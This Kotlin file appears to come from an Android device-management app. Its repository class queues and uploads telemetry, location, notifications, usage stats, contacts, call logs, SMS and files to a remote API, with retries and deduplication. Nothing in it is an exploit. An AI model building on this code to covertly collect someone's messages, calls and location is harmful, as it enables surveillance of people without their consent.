package com.devicemanager.data.repository

import android.util.Log
import com.devicemanager.data.local.dao.EventQueueDao
import com.devicemanager.data.local.entity.QueuedEvent
import com.devicemanager.data.remote.ApiService
import com.devicemanager.data.remote.model.*
import com.devicemanager.util.Constants
import com.google.gson.Gson
import com.google.gson.JsonObject

/**
 * Repository for syncing offline-queued events and various data types.
 * Retries queued events when network is available.
 */
class SyncRepository(
    private val apiService: ApiService,
    private val eventQueueDao: EventQueueDao,
    private val gson: Gson
) {
    companion object {
        private const val TAG = "SyncRepository"
        private const val MAX_RETRIES = 5
    }

    /**
     * Process all queued events and attempt to upload them.
     * Returns the number of events successfully synced.
     */
    suspend fun syncQueuedEvents(): Int {
        return syncQueuedEventsBatch(100)
    }

    /**
     * Process a batch of queued events with dedup verification.
     * Checks for duplicate dedupKeys before processing.
     * Returns the number of events successfully synced.
     */
    suspend fun syncQueuedEventsBatch(limit: Int): Int {
        var syncedCount = 0
        try {
            val events = eventQueueDao.getQueuedEvents(limit = limit)
            // Dedup: track seen dedupKeys within this batch
            val seenKeys = mutableSetOf<String>()

            for (event in events) {
                // Skip if we've already processed this dedup key in this batch
                if (event.dedupKey.isNotBlank() && seenKeys.contains(event.dedupKey)) {
                    Log.d(TAG, "Skipping duplicate in batch: ${event.dedupKey}")
                    eventQueueDao.deleteById(event.id)
                    syncedCount++
                    continue
                }
                if (event.dedupKey.isNotBlank()) {
                    seenKeys.add(event.dedupKey)
                }

                val success = processEvent(event)
                if (success) {
                    eventQueueDao.deleteById(event.id)
                    syncedCount++
                } else {
                    val updated = event.copy(
                        retryCount = event.retryCount + 1,
                        lastError = "Retry failed"
                    )
                    if (updated.retryCount >= MAX_RETRIES) {
                        eventQueueDao.deleteById(event.id)
                        Log.w(TAG, "Event exhausted after $MAX_RETRIES retries: ${event.eventType}")
                    } else {
                        eventQueueDao.update(updated)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Sync error: ${e.message}", e)
        }
        return syncedCount
    }

    /**
     * Process a single queued event based on its type.
     */
    private suspend fun processEvent(event: QueuedEvent): Boolean {
        return try {
            when (event.eventType) {
                "TELEMETRY" -> {
                    val request = gson.fromJson(event.payloadJson, TelemetryRequest::class.java)
                    apiService.sendTelemetry(request).isSuccessful
                }
                "LOCATION" -> {
                    val request = gson.fromJson(event.payloadJson, LocationRequest::class.java)
                    apiService.sendLocation(request).isSuccessful
                }
                "NOTIFICATION" -> {
                    val request = gson.fromJson(event.payloadJson, NotificationRequest::class.java)
                    apiService.sendNotification(request).isSuccessful
                }
                "USAGE" -> {
                    val request = gson.fromJson(event.payloadJson, UsageRequest::class.java)
                    apiService.sendUsageStats(request).isSuccessful
                }
                "CONTACTS" -> {
                    val request = gson.fromJson(event.payloadJson, ContactsSyncRequest::class.java)
                    apiService.syncContacts(request).isSuccessful
                }
                "CALLS" -> {
                    val request = gson.fromJson(event.payloadJson, CallsSyncRequest::class.java)
                    apiService.syncCalls(request).isSuccessful
                }
                "SMS" -> {
                    val request = gson.fromJson(event.payloadJson, SmsSyncRequest::class.java)
                    apiService.syncSms(request).isSuccessful
                }
                "FILES" -> {
                    val request = gson.fromJson(event.payloadJson, FilesSyncRequest::class.java)
                    apiService.syncFiles(request).isSuccessful
                }
                else -> {
                    Log.w(TAG, "Unknown event type: ${event.eventType}")
                    false
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Process event error: ${e.message}", e)
            false
        }
    }

    /**
     * Queue a generic event for retry.
     */
    suspend fun queueEvent(
        eventType: String,
        endpoint: String,
        payload: Any,
        dedupKey: String
    ) {
        try {
            val json = gson.toJson(payload)
            val event = QueuedEvent(
                eventType = eventType,
                endpoint = endpoint,
                payloadJson = json,
                dedupKey = dedupKey,
                createdAt = System.currentTimeMillis()
            )
            eventQueueDao.insert(event)
        } catch (e: Exception) {
            Log.e(TAG, "Queue event error: ${e.message}", e)
        }
    }

    /**
     * Get the current queue size.
     */
    suspend fun getQueueSize(): Int {
        return try {
            eventQueueDao.getQueueCount()
        } catch (e: Exception) {
            0
        }
    }
}
